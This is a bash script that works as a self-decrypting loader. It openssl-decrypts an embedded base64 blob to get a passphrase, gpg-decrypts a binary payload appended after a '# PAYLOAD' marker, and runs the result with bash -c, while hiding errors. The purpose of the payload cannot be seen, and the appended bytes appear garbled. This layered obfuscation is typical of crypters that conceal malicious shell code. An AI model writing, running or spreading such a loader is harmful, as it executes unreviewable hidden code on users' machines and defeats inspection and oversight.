#!/bin/bash
script='U2FsdGVkX19AaVI12Z2iwe1Ca/dkhtuY7eP5j+N7yJUAls9YYG6AvI84KzyORgN8kR6z5WncdzAcIdFg80QyLP+S8elFMb7J7GKM4SBadvPuAKsCedj7INLAXxEnpDkM0is6T4aaf3VBvfrz1dxW/feT0jT6rUVaOdboHzSQpCsKKSeuahpd6aLWMyLbFDz7JrkkTdZzr3JxbcMMtalF22+1DffkHot+tr0LP+ziHQwneq6Yl+8m+dcIAmMp1iyLzyhSELVtHx2TvaxmMWshlkeIdZGNsX1zgeVc0iqyBj3VLZ4CyK3M5a33Im/vnsw3wsyZqQ7lzwHOXfqxU1QIcqeTyc1PSNc9TsDe50ourM4qLhPevEecXVNgPT3LcgpDNg2jXgSz0IHBAn15bpNiH9kCgyO69AndFr3pwKP6votRDRvyIqTVYMMgBd09TM+e5hrTQZKK0TqRzmqW0Kq4ebufxc+68Q8cnfAyuGHTV4I7DyV1/tfP9F9IQsMsU/V+w+r/vJs2ixA5PzThezUWtLM3RnspRDK2NIpYc+2OgN7c+nGs4euusKa/BfSEaHGvBJzaYsRbPWALr0NzTJe0dWVnzZY4h2yin55OvVM0DACfnjA0vgeYMM7+7SgaUUasBJ9kDNgZ0m5e1a6DPnoMQk7Wsz1Ugp7lphvqYWwytfDDcOw3IuUhWT7ZJ+dqfkSyk0xfhtE8D7cCWHR73OAKTqHzVEKkWS81AWc02jTmNxucwfFLHJN9cpAn5cMbTsCCIdx/3GbwQx8EJedwkaXjOuUVS1BYiz01PsPmMeFUg=='
pass=$(echo "$script" | sed -n 's#.*An\(.*\)An.*#\1#p')
cipher=$(echo "$script" | sed "s#An${pass}An##")
FULL=$(echo "$cipher" | openssl enc -aes-256-cbc -a -d -pbkdf2 -iter 1000 -pass pass:"$pass" 2>/dev/null)
[ -z "$FULL" ] && { echo "!"; exit 1; }
menu=$(echo "$FULL" | awk '{print $1}')
gpg_output=$(tail -n +$(grep -an "^# PAYLOAD" "$0" | cut -d: -f1 | awk '{print $1+1}') "$0"              | gpg --batch --yes --passphrase "$menu" --decrypt 2>/dev/null)
[ $? -ne 0 ] && { echo "!"; exit 1; }
bash -c "$gpg_output" "$@"
exit $?
# PAYLOAD
Œ	9	ü,z¿ÿÒŸ;´àI;t‹TûTi]Ş;WQè6¢Õ9Ü÷»î7¼QŸŸHLA¹m×œ|Áoª§n“ŒCÃĞˆÎkª¼öìâXNH¾ÇÌwÒpP¿+‡Ñäar<Ê‹Y
åíqa„¬‰úKIjÃ*«õÀ„B<¯¸ròn?E.ú!¤G“Z Zr¶#+ò^@û¢İ{g ´BA